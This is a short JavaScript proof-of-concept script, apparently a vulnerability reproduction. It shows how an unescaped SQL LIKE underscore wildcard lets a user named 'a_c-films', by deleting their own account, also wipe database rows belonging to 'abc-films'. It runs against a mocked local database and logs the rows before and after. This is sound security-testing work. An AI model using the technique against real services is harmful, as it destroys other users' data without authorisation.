import { makeKv, makeRealD1, makeEnv, call, createUser } from "./kit.mjs";
import assert from "node:assert/strict";

const DB = makeRealD1({ sql: ["CREATE INDEX IF NOT EXISTS idx_creator_lists_likes ON creator_lists(likes);"] });
const env = makeEnv({ CONFIGS: makeKv(), DB });

// Victim and attacker whose usernames collide under SQL LIKE's `_` wildcard.
const victim = await createUser(env, "abc-films");     // no underscore
const attacker = await createUser(env, "a_c-films");   // `_` matches any char

for (const u of [victim, attacker]) {
  const r = await call(env, "/api/creator/lists/save", { method: "POST", json: {
    creatorName: u.creatorName, creatorKey: u.creatorKey,
    name: "Top Ten", type: "movie", visibility: "public", items: [{ id: "tt1" }],
  }});
  assert.equal(r.body.ok, true, JSON.stringify(r.body));
}
const rows = () => DB.q("SELECT id, likes FROM creator_lists ORDER BY id");
console.log("D1 rows before:", rows());

// Give the victim a like so we can see the count too.
await call(env, "/api/lists/like", { method: "POST", ip: "203.0.113.9", json: { username: "abc-films", slug: "top-ten" } });
console.log("D1 rows after a like:", rows());

// The attacker now deletes their OWN account. Nothing else.
const del = await call(env, "/api/creator/delete-account", { method: "POST", json: {
  creatorName: attacker.creatorName, creatorKey: attacker.creatorKey, confirm: "DELETE",
}});
console.log("delete-account response:", del.status, del.body);
console.log("D1 rows after attacker deletes their own account:", rows());
console.log("D1 creators after:", DB.q("SELECT username FROM creators ORDER BY username"));
console.log("victim's KV list still present:", !!env.CONFIGS._store.get("creatorlist:abc-films:top-ten"));

// What does the victim's own D1-backed read return now?
const pub = await call(env, "/lists/public.json");
console.log("public.json entries:", JSON.stringify(pub.body).slice(0, 400));
